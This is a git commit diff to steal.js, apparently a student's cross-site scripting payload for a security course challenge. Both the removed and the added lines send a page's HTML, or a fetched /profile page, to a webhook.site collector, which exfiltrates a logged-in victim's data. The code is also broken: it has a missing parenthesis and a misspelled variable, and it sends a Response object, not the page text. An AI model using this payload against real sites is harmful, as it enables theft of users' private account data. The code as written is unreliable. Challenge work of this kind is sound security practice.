6e4d00543a04b9a15491c11c455b04aa256746fd
Dan1e1B <147431777+Dan1e1B@users.noreply.github.com>
2025-12-28 15:26:14 +0000

    Update steal.js

--- steal.js
+++ steal.js
@@ -3,14 +3,8 @@
 async function sendData(){
 
   try {
-    await fetch("https://webhook.site/2bfe5e22-b3b8-4685-b127-a69bf9ec6149/?data=" + encodeURIComponent(document.documentElement.outerHTML));
-    console.log("Sucess!");
-    window.location = "/profile";
-    await fetch("https://webhook.site/2bfe5e22-b3b8-4685-b127-a69bf9ec6149/?data=" + encodeURIComponent(document.documentElement.outerHTML));
-    console.log("Sucess!");
-    window.location = "/";
-    
-    await fetch("https://webhook.site/2bfe5e22-b3b8-4685-b127-a69bf9ec6149/?data=" + encodeURIComponent(document.documentElement.outerHTML);
+    const respones = await fetch("http://ssof2526.challenges.cwte.me:12017/profile");
+    await fetch("https://webhook.site/2bfe5e22-b3b8-4685-b127-a69bf9ec6149/?data=" + encodeURIComponent(response));
     console.log("Sucess!");
   } catch(error) {
     console.log(error);
